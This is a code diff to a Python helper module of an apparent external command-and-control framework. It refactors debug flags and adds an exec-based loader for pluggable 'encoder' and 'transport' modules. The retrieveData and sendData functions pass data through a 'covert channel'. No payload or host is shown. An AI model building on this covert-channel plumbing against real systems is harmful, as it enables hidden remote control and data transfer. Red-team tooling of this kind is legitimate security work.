@@ -1,6 +1,15 @@
 import socket
 import struct
 import config
+def importModule(modName, modType):
+	"""
+	Imports a passed module as either an 'encoder' or a 'transport'; called with either encoder.X() or transport.X()
+	"""
+	prep_global = "global " + modType
+	exec(prep_global)
+	importName = "import utils." + modType + "s." + modName + " as " + modType
+	exec(importName, globals())
+
 def createSocket():
 	# Borrowed from https://github.com/outflanknl/external_c2/blob/master/python_c2ex.py
 	d = {}
@@ -44,11 +53,11 @@ def retrieveData():
 
 	data = transport.retrieveData()
 
-	if args.debug:
-		print (commonUtils.color("RAW RETRIEVED DATA: ", status=False, yellow=True) + "%s") % (data)
+	if config.debug:
+		print (color("RAW RETRIEVED DATA: ", status=False, yellow=True) + "%s") % (data)
 
 	# Prepare the recieved data by running it through the decoder
-	preped_data = commonUtils.decodeData(data)
+	preped_data = decodeData(data)
 
 	return preped_data
 
@@ -56,10 +65,10 @@ def sendData(data):
 	# This will upload the data via the covert channel
 	# returns a confirmation that the data has been sent
 
-	if args.debug:
-		print (commonUtils.color("RAW DATA TO BE SENT: ", status=False, yellow=True) + "%s") % (data)
+	if config.debug:
+		print (color("RAW DATA TO BE SENT: ", status=False, yellow=True) + "%s") % (data)
 	# Prepares the data to be sent via the covert channel
-	preped_data = commonUtils.prepData(data)
+	preped_data = prepData(data)
 
 	transport.sendData(preped_data)
 
